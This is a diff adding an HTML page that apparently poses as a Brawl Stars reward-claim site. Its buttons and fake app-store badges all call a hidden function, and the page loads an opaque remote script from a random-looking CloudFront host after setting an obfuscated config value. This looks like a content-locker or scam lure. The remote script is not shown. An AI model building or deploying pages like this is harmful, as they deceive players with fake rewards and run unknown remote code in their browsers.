@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim - BrawlStars</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript">
+        var aHWCU_AlR_fJScfc={"it":4324283,"key":"d8f2a"};
+    </script>
+    <script src="https://d9cshxmf0qazr.cloudfront.net/52531ad.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="/logo.png" alt="">
+        </div>
+        <p>Claim a Reward in Brawl Stars!</p>
+        <button onclick="_yi()"><span class="txt">Claim Reward</span></button>
+        <p class="p2" >Download Brawl Stars</p>
+        <div class="playstore" onclick="_yi()"><img src="/play-removebg-preview.png" alt=""></div>
+        <div class="appstore" onclick="_yi()"><img src="/apple.webp" alt=""></div>
+    </div>
+
+</body>
+
+</html>
+
